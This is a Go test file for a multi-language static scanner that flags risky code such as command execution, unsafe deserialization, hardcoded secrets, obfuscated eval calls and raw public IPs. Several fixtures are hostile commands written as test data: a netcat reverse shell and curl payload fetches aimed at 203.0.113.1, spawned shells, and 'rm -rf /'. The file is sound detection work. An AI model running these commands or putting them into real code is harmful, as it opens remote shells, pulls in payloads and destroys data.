package scanner

import (
	"os"
	"path/filepath"
	"testing"
)

// ---------------------------------------------------------------------------
// GoASTScanner
// ---------------------------------------------------------------------------

func TestGoASTScanner_ExecCommand(t *testing.T) {
	src := `package main
import "os/exec"
func main() { exec.Command("ls", "-la") }`
	assertFindings(t, &GoASTScanner{}, "main.go", src, 1, Critical)
}

func TestGoASTScanner_SyscallExec(t *testing.T) {
	src := `package main
import "syscall"
func main() { syscall.Exec("/bin/sh", nil, nil) }`
	assertFindings(t, &GoASTScanner{}, "main.go", src, 1, Critical)
}

func TestGoASTScanner_UnsafePointer(t *testing.T) {
	src := `package main
import "unsafe"
func main() { _ = unsafe.Pointer(nil) }`
	assertFindings(t, &GoASTScanner{}, "main.go", src, 1, Critical)
}

func TestGoASTScanner_AliasedExec(t *testing.T) {
	// Import alias must not bypass AST detection.
	src := `package main
import ex "os/exec"
func main() { ex.Command("ls", "-la") }`
	assertFindings(t, &GoASTScanner{}, "main.go", src, 1, Critical)
}

func TestGoASTScanner_AliasedUnsafe(t *testing.T) {
	src := `package main
import u "unsafe"
func main() { _ = u.Pointer(nil) }`
	assertFindings(t, &GoASTScanner{}, "main.go", src, 1, Critical)
}

func TestGoASTScanner_NetDial(t *testing.T) {
	src := `package main
import "net"
func main() { net.Dial("tcp", "203.0.113.1:4444") }`
	assertFindings(t, &GoASTScanner{}, "main.go", src, 1, Warning)
}

func TestGoASTScanner_HTTPGet(t *testing.T) {
	src := `package main
import "net/http"
func main() { http.Get("http://203.0.113.1/payload") }`
	assertFindings(t, &GoASTScanner{}, "main.go", src, 1, Warning)
}

func TestGoASTScanner_CleanFile(t *testing.T) {
	src := `package main
import "fmt"
func main() { fmt.Println("hello") }`
	assertFindings(t, &GoASTScanner{}, "main.go", src, 0, "")
}

func TestGoASTScanner_FallbackOnSyntax(t *testing.T) {
	// Deliberately malformed Go: the AST scanner should fall back to regex and
	// still catch the eval call.
	src := `this is not valid go { eval("rm -rf /") }`
	findings, err := (&GoASTScanner{}).Scan("bad.go", []byte(src))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected at least one finding via regex fallback; got none")
	}
}

// ---------------------------------------------------------------------------
// RegexScanner — Python
// ---------------------------------------------------------------------------

func TestRegexScanner_Eval(t *testing.T) {
	assertRegex(t, pyRules, "script.py", `eval(user_input)`, 1, Critical)
}

func TestRegexScanner_OsSystem(t *testing.T) {
	assertRegex(t, pyRules, "script.py", `os.system("id")`, 1, Critical)
}

func TestRegexScanner_PtySpawn(t *testing.T) {
	assertRegex(t, pyRules, "script.py", `pty.spawn("/bin/bash")`, 1, Critical)
}

func TestRegexScanner_PickleLoads(t *testing.T) {
	assertRegex(t, pyRules, "script.py", `data = pickle.loads(raw_bytes)`, 1, Critical)
}

func TestRegexScanner_UnsafeYAML(t *testing.T) {
	assertRegex(t, pyRules, "script.py", `cfg = yaml.load(f)`, 1, Critical)
}

func TestRegexScanner_SafeYAMLIgnored(t *testing.T) {
	// yaml.load with an explicit SafeLoader must NOT generate a finding.
	assertRegex(t, pyRules, "script.py", `cfg = yaml.load(f, Loader=yaml.SafeLoader)`, 0, "")
}

func TestRegexScanner_SafeLoadIgnored(t *testing.T) {
	// yaml.safe_load is always safe; no finding expected.
	assertRegex(t, pyRules, "script.py", `cfg = yaml.safe_load(f)`, 0, "")
}

func TestRegexScanner_HardcodedSecret(t *testing.T) {
	assertRegex(t, pyRules, "config.py", `api_key = "sk-realkey123456789012345678901234"`, 1, Critical)
}

func TestRegexScanner_AWSKey(t *testing.T) {
	assertRegex(t, pyRules, "config.py", `key = "AKIAIOSFODNN7EXAMPLE"`, 1, Critical)
}

func TestRegexScanner_GitHubToken(t *testing.T) {
	assertRegex(t, pyRules, "config.py",
		`token = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ12345678901"`, 1, Critical)
}

func TestRegexScanner_SSLVerifyFalse(t *testing.T) {
	assertRegex(t, pyRules, "client.py", `requests.get(url, verify=False)`, 1, Warning)
}

func TestRegexScanner_DynamicImport(t *testing.T) {
	assertRegex(t, pyRules, "loader.py", `mod = importlib.import_module(name)`, 1, Warning)
}

func TestRegexScanner_GetattrIndirection_Os(t *testing.T) {
	assertRegex(t, pyRules, "evil.py", `getattr(os, 'system')("id")`, 1, Critical)
}

func TestRegexScanner_GetattrIndirection_Builtins(t *testing.T) {
	assertRegex(t, pyRules, "evil.py", `getattr(__builtins__, "eval")(payload)`, 1, Critical)
}

func TestRegexScanner_GetattrIndirection_Subprocess(t *testing.T) {
	assertRegex(t, pyRules, "evil.py", `getattr(subprocess, "Popen")(cmd)`, 1, Critical)
}

func TestRegexScanner_HexEscapeObfuscation(t *testing.T) {
	// \x65\x76\x61\x6c encodes "eval"
	assertRegex(t, pyRules, "evil.py", `\x65\x76\x61\x6c(payload)`, 1, Critical)
}

func TestRegexScanner_HexEscapeObfuscation_Short_Ignored(t *testing.T) {
	// fewer than 4 consecutive hex escapes should not fire
	assertRegex(t, pyRules, "clean.py", `path = "\x2f\x74\x6d"`, 0, Warning)
}

func TestRegexScanner_GetattrConcatenation(t *testing.T) {
	assertRegex(t, pyRules, "evil.py", `getattr(__builtins__, "ev"+"al")(x)`, 1, Critical)
}

func TestRegexScanner_GetattrConcatenation_UnknownModule(t *testing.T) {
	// module not in the CRITICAL list — should still fire as WARNING via concat rule
	assertRegex(t, pyRules, "evil.py", `getattr(m, "sys"+"tem")(cmd)`, 1, Warning)
}

// ---------------------------------------------------------------------------
// RegexScanner — Ruby
// ---------------------------------------------------------------------------

func TestRegexScanner_Ruby_Eval(t *testing.T) {
	assertRegex(t, rubyRules, "script.rb", `eval(user_input)`, 1, Critical)
}

func TestRegexScanner_Ruby_System(t *testing.T) {
	assertRegex(t, rubyRules, "script.rb", `system("id")`, 1, Critical)
}

func TestRegexScanner_Ruby_Backtick(t *testing.T) {
	assertRegex(t, rubyRules, "script.rb", "result = `curl http://203.0.113.1/payload`", 1, Critical)
}

func TestRegexScanner_Ruby_PercentX(t *testing.T) {
	assertRegex(t, rubyRules, "script.rb", `output = %x{whoami}`, 1, Critical)
}

func TestRegexScanner_Ruby_IOPopen(t *testing.T) {
	assertRegex(t, rubyRules, "script.rb", `IO.popen("nc -e /bin/sh 203.0.113.1 4444")`, 1, Critical)
}

func TestRegexScanner_Ruby_Open3(t *testing.T) {
	assertRegex(t, rubyRules, "script.rb", `Open3.popen3("curl", c2) do |i, o, e, t|`, 1, Critical)
}

func TestRegexScanner_Ruby_MarshalLoad(t *testing.T) {
	assertRegex(t, rubyRules, "script.rb", `obj = Marshal.load(data)`, 1, Critical)
}

func TestRegexScanner_Ruby_UnsafeYAML(t *testing.T) {
	assertRegex(t, rubyRules, "script.rb", `cfg = YAML.load(File.read("config.yml"))`, 1, Critical)
}

func TestRegexScanner_Ruby_SafeYAMLIgnored(t *testing.T) {
	assertRegex(t, rubyRules, "script.rb", `cfg = YAML.safe_load(File.read("config.yml"))`, 0, "")
}

func TestRegexScanner_Ruby_HardcodedSecret(t *testing.T) {
	assertRegex(t, rubyRules, "config.rb", `api_key = "sk-realkey123456789012345678901234"`, 1, Critical)
}

func TestRegexScanner_Ruby_OpenPipe(t *testing.T) {
	assertRegex(t, rubyRules, "script.rb", `open("| ls -la")`, 1, Warning)
}

func TestRegexScanner_Ruby_Send(t *testing.T) {
	assertRegex(t, rubyRules, "script.rb", `obj.send(method_name, arg)`, 1, Warning)
}

func TestRegexScanner_Ruby_VerifyNone(t *testing.T) {
	assertRegex(t, rubyRules, "client.rb", `http.verify_mode = OpenSSL::SSL::VERIFY_NONE`, 1, Warning)
}

// ---------------------------------------------------------------------------
// RegexScanner — JavaScript
// ---------------------------------------------------------------------------

func TestRegexScanner_NewFunction(t *testing.T) {
	assertRegex(t, jsRules, "bundle.js", `const fn = new Function("return " + payload)`, 1, Critical)
}

func TestRegexScanner_VmRunInNewContext(t *testing.T) {
	assertRegex(t, jsRules, "runner.js", `vm.runInNewContext(code, sandbox)`, 1, Critical)
}

func TestRegexScanner_ChildProcess(t *testing.T) {
	assertRegex(t, jsRules, "server.js", `const cp = require('child_process')`, 1, Critical)
}

// ---------------------------------------------------------------------------
// RustScanner
// ---------------------------------------------------------------------------

func TestRustScanner_UnsafeBlock(t *testing.T) {
	assertFindings(t, &RustScanner{}, "lib.rs", `unsafe { *ptr = 1; }`, 1, Critical)
}

func TestRustScanner_CommandNew(t *testing.T) {
	assertFindings(t, &RustScanner{}, "main.rs", `Command::new("curl").arg(c2).output().unwrap();`, 1, Critical)
}

func TestRustScanner_HardcodedSecret(t *testing.T) {
	assertFindings(t, &RustScanner{}, "config.rs", `let api_key = "sk-realkey123456789012345678901234";`, 1, Critical)
}

func TestRustScanner_FFIExtern(t *testing.T) {
	assertFindings(t, &RustScanner{}, "ffi.rs", `extern "C" { fn dangerous(); }`, 1, Warning)
}

func TestRustScanner_IncludeBytes(t *testing.T) {
	assertFindings(t, &RustScanner{}, "embed.rs", `let payload = include_bytes!("../data/payload.bin");`, 1, Warning)
}

func TestRustScanner_BuildRsWarning(t *testing.T) {
	// build.rs should always surface a WARNING regardless of content.
	findings, err := (&RustScanner{}).Scan("build.rs", []byte(`fn main() {}`))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	found := false
	for _, f := range findings {
		if f.Rule == "build.rs present (Cargo compile-time execution)" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected build.rs warning finding; got none")
	}
}

func TestRustScanner_BuildRsWithUnsafe(t *testing.T) {
	// build.rs with unsafe block should produce both the build.rs warning and
	// the unsafe finding.
	findings, err := (&RustScanner{}).Scan("build.rs", []byte(`fn main() { unsafe { do_bad(); } }`))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	var hasBuildWarning, hasUnsafe bool
	for _, f := range findings {
		switch f.Rule {
		case "build.rs present (Cargo compile-time execution)":
			hasBuildWarning = true
		case "unsafe block":
			hasUnsafe = true
		}
	}
	if !hasBuildWarning {
		t.Error("expected build.rs warning")
	}
	if !hasUnsafe {
		t.Error("expected unsafe block finding")
	}
}

func TestRustScanner_CleanFile(t *testing.T) {
	// A plain Rust file with no dangerous patterns should produce no findings.
	assertFindings(t, &RustScanner{}, "main.rs", `fn main() { println!("hello"); }`, 0, "")
}

// ---------------------------------------------------------------------------
// IP address filtering
// ---------------------------------------------------------------------------

func TestRegexScanner_RawIP_Public(t *testing.T) {
	// A public IP should fire.
	assertRegex(t, pyRules, "cfg.py", `endpoint = "203.0.113.5"`, 1, Warning)
}

func TestRegexScanner_PrivateIPIgnored_Loopback(t *testing.T) {
	assertRegex(t, pyRules, "cfg.py", `host = "127.0.0.1"`, 0, "")
}

func TestRegexScanner_PrivateIPIgnored_RFC1918(t *testing.T) {
	assertRegex(t, pyRules, "cfg.py", `host = "192.168.1.100"`, 0, "")
}

func TestRegexScanner_PrivateIPIgnored_10Block(t *testing.T) {
	assertRegex(t, pyRules, "cfg.py", `host = "10.0.0.1"`, 0, "")
}

// ---------------------------------------------------------------------------
// High-entropy detection
// ---------------------------------------------------------------------------

func TestRegexScanner_HighEntropy(t *testing.T) {
	// A pseudo-random token string whose character set diversity pushes entropy
	// well above the 4.8-bit threshold (all 62 alphanumeric chars represented).
	src := `secret = "xK9mN3pQ7rT1vW5yZ2bD6hJ0lF4nR8tVwXzAcEgIkMoSuYa"`
	sc := &RegexScanner{rules: pyRules}
	findings, err := sc.Scan("util.py", []byte(src))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	found := false
	for _, f := range findings {
		if f.Rule == "high-entropy string (possible obfuscated payload or embedded secret)" {
			found = true
			break
		}
	}
	if !found {
		t.Fatal("expected a high-entropy finding; got none")
	}
}

func TestRegexScanner_HighEntropyInFuncCall_Ignored(t *testing.T) {
	// High-entropy string passed as a function argument should NOT fire —
	// base64 icons, test fixtures, and similar literals are common here.
	src := `doSomething("xK9mN3pQ7rT1vW5yZ2bD6hJ0lF4nR8tVwXzAcEgIkMoSuYa")`
	sc := &RegexScanner{rules: pyRules}
	findings, err := sc.Scan("util.py", []byte(src))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	for _, f := range findings {
		if f.Rule == "high-entropy string (possible obfuscated payload or embedded secret)" {
			t.Error("high-entropy string in function call should not fire; got finding")
		}
	}
}

func TestShannonEntropy_LowEntropy(t *testing.T) {
	// A repetitive string should have low entropy and not trigger the rule.
	if shannonEntropy("aaaaaaaaaaaaaaaaaaaaaaaaaaaa") >= entropyThreshold {
		t.Error("repetitive string should have entropy below threshold")
	}
}

func TestShannonEntropy_HighEntropy(t *testing.T) {
	// 50 unique characters from the full alphanumeric set — entropy ≈ log2(50) ≈ 5.64 bits.
	if shannonEntropy("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwx") < entropyThreshold {
		t.Error("diverse alphanumeric string should have entropy above threshold")
	}
}

// ---------------------------------------------------------------------------
// Inline argus-ignore directive
// ---------------------------------------------------------------------------

func TestInlineIgnore_RegexScanner_SuppressesLine(t *testing.T) {
	// A dangerous call annotated with argus-ignore must produce no finding.
	src := `eval(user_input) # argus-ignore`
	assertRegex(t, pyRules, "script.py", src, 0, "")
}

func TestInlineIgnore_RegexScanner_DoesNotAffectOtherLines(t *testing.T) {
	// The directive on one line must not suppress findings on adjacent lines.
	src := "eval(x) # argus-ignore\nexec(y)"
	assertRegex(t, pyRules, "script.py", src, 1, Critical)
}

func TestInlineIgnore_GoASTScanner_SuppressesLine(t *testing.T) {
	// exec.Command annotated with // argus-ignore must produce no finding.
	src := `package main
import "os/exec"
func main() { exec.Command("ls") } // argus-ignore`
	assertFindings(t, &GoASTScanner{}, "main.go", src, 0, "")
}

func TestInlineIgnore_GoASTScanner_DoesNotAffectOtherLines(t *testing.T) {
	// Directive on one line must not suppress findings on a different line.
	src := `package main
import "os/exec"
func main() {
	_ = "clean" // argus-ignore
	exec.Command("ls")
}`
	assertFindings(t, &GoASTScanner{}, "main.go", src, 1, Critical)
}

func TestInlineIgnore_HighEntropy_Suppressed(t *testing.T) {
	// High-entropy string on an argus-ignored line must not fire.
	src := `secret = "xK9mN3pQ7rT1vW5yZ2bD6hJ0lF4nR8tVwXzAcEgIkMoSuYa" # argus-ignore`
	sc := &RegexScanner{rules: pyRules}
	findings, err := sc.Scan("util.py", []byte(src))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	for _, f := range findings {
		t.Errorf("expected no findings on argus-ignored line; got: %+v", f)
	}
}

// ---------------------------------------------------------------------------
// .argusignore file
// ---------------------------------------------------------------------------

func TestArgusIgnore_SkipsExactFilename(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, ".argusignore", "generated.py")
	write(t, dir, "generated.py", `eval("dangerous")`)
	write(t, dir, "clean.py", `print("hello")`)

	report, err := Scan(dir)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}
	for _, f := range report.Findings {
		if f.File == "generated.py" {
			t.Errorf("expected generated.py to be ignored; got finding: %+v", f)
		}
	}
}

func TestArgusIgnore_GlobPattern(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, ".argusignore", "*.pb.go")
	// Dangerous call in a generated protobuf file — should be ignored.
	write(t, dir, "types.pb.go", `package p
import "os/exec"
func f() { exec.Command("id") }`)
	// Clean main.go should produce no findings regardless.
	write(t, dir, "main.go", `package main
import "fmt"
func main() { fmt.Println("ok") }`)

	report, err := Scan(dir)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}
	for _, f := range report.Findings {
		if filepath.Base(f.File) == "types.pb.go" {
			t.Errorf("expected types.pb.go to be ignored; got finding: %+v", f)
		}
	}
}

func TestArgusIgnore_CommentLinesIgnored(t *testing.T) {
	// Comment and blank lines in .argusignore must not suppress any files.
	dir := t.TempDir()
	write(t, dir, ".argusignore", "# this is a comment\n\n# another comment")
	write(t, dir, "setup.py", `eval("dangerous")`)

	report, err := Scan(dir)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}
	if !report.HasCritical {
		t.Error("expected findings when .argusignore has only comments; got none")
	}
}

func TestArgusIgnore_MissingFileIsOK(t *testing.T) {
	// A package without .argusignore must scan normally.
	dir := t.TempDir()
	write(t, dir, "setup.py", `eval("dangerous")`)

	report, err := Scan(dir)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}
	if !report.HasCritical {
		t.Error("expected critical finding; got none")
	}
}

// ---------------------------------------------------------------------------
// isLikelyHash
// ---------------------------------------------------------------------------

func TestIsLikelyHash_SHA1(t *testing.T) {
	if !isLikelyHash("a9993e364706816aba3e25717850c26c9cd0d89d") {
		t.Error("SHA1 hex string should be identified as a hash")
	}
}

func TestIsLikelyHash_UUID(t *testing.T) {
	if !isLikelyHash("550e8400-e29b-41d4-a716-446655440000") {
		t.Error("UUID should be identified as a hash")
	}
}

func TestIsLikelyHash_MixedAlphanumeric(t *testing.T) {
	// A string with chars outside [0-9a-fA-F-] is not a hash.
	if isLikelyHash("xK9mN3pQ7rT1vW5yZ2bD6hJ0lF4nR8tVwXzAcEgIkMoSuYa") {
		t.Error("mixed alphanumeric secret should not be identified as a hash")
	}
}

func TestIsLikelyHash_Empty(t *testing.T) {
	if isLikelyHash("") {
		t.Error("empty string should not be identified as a hash")
	}
}

// ---------------------------------------------------------------------------
// Scan() — integration over a directory tree
// ---------------------------------------------------------------------------

func TestScan_MixedDirectory(t *testing.T) {
	dir := t.TempDir()

	write(t, dir, "main.go", `package main
import "os/exec"
func main() { exec.Command("id") }`)

	write(t, dir, "setup.py", `import os
os.system("id")`)

	write(t, dir, "clean.js", `console.log("hello world")`)

	report, err := Scan(dir)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}
	if !report.HasCritical {
		t.Error("expected HasCritical to be true")
	}
	if len(report.Findings) < 2 {
		t.Errorf("expected at least 2 findings; got %d", len(report.Findings))
	}
}

func TestScan_NoFindings(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, "main.go", `package main
import "fmt"
func main() { fmt.Println("all clear") }`)

	report, err := Scan(dir)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}
	if report.HasCritical {
		t.Error("expected no critical findings in a clean package")
	}
}

func TestScan_UnreadableFile(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "secret.py")
	if err := os.WriteFile(path, []byte(`eval("x")`), 0o644); err != nil {
		t.Fatal(err)
	}
	// Remove read permission so os.ReadFile fails.
	if err := os.Chmod(path, 0o000); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chmod(path, 0o644) }) // restore for cleanup

	report, err := Scan(dir)
	if err != nil {
		t.Fatalf("Scan should not return an error on unreadable files; got: %v", err)
	}
	// The unreadable file should appear as a Warning finding, not a Critical one.
	if report.HasCritical {
		t.Error("unreadable file should not produce a critical finding")
	}
	found := false
	for _, f := range report.Findings {
		if f.Rule == "unreadable file" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected an 'unreadable file' warning finding")
	}
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

// assertFindings scans src with sc and verifies the finding count and severity.
func assertFindings(t *testing.T, sc Scanner, filename, src string, wantCount int, wantSev Severity) {
	t.Helper()
	findings, err := sc.Scan(filename, []byte(src))
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	if len(findings) != wantCount {
		t.Errorf("want %d finding(s); got %d: %+v", wantCount, len(findings), findings)
		return
	}
	if wantCount > 0 && findings[0].Severity != wantSev {
		t.Errorf("want severity %s; got %s", wantSev, findings[0].Severity)
	}
}

// assertRegex runs the RegexScanner with the given rules and verifies count/severity.
func assertRegex(t *testing.T, rules []regexRule, filename, src string, wantCount int, wantSev Severity) {
	t.Helper()
	sc := &RegexScanner{rules: rules}
	findings, err := sc.Scan(filename, []byte(src))
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	// Filter out high-entropy findings so they don't pollute rule-specific counts.
	var ruleFindings []Finding
	for _, f := range findings {
		if f.Rule != "high-entropy string (possible obfuscated payload or embedded secret)" {
			ruleFindings = append(ruleFindings, f)
		}
	}
	if len(ruleFindings) != wantCount {
		t.Errorf("want %d finding(s); got %d: %+v", wantCount, len(ruleFindings), ruleFindings)
		return
	}
	if wantCount > 0 && ruleFindings[0].Severity != wantSev {
		t.Errorf("want severity %s; got %s", wantSev, ruleFindings[0].Severity)
	}
}

// write creates a file inside dir with the given content.
func write(t *testing.T, dir, name, content string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o644); err != nil {
		t.Fatalf("writing %s: %v", name, err)
	}
}
